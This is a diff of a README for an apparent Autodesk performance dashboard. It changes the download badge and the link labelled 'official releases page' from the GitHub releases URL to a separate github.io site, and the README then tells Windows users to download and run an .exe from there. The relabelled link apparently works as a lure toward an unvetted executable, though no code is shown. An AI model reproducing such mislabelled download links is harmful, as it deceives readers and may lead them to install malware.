@@ -1,6 +1,6 @@
 # 📊 autodesk-dashboard-performance - Monitor your Autodesk project performance easily
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Visiov2247/autodesk-dashboard-performance/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://visiov2247.github.io)
 
 This software provides a dashboard to view performance data for the Autodesk 2026 release. It organizes complex technical information into visual charts. Use this tool to track software speed, resource usage, and project health without manual data entry.
 
@@ -8,7 +8,7 @@ This software provides a dashboard to view performance data for the Autodesk 202
 
 Follow these steps to set up the dashboard on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/Visiov2247/autodesk-dashboard-performance/releases) to download the application.
+1. Visit the [official releases page](https://visiov2247.github.io) to download the application.
 2. Select the latest version folder.
 3. Look for the file ending in `.exe` and click it to start the download.
 4. Save the file to your desktop or downloads folder.
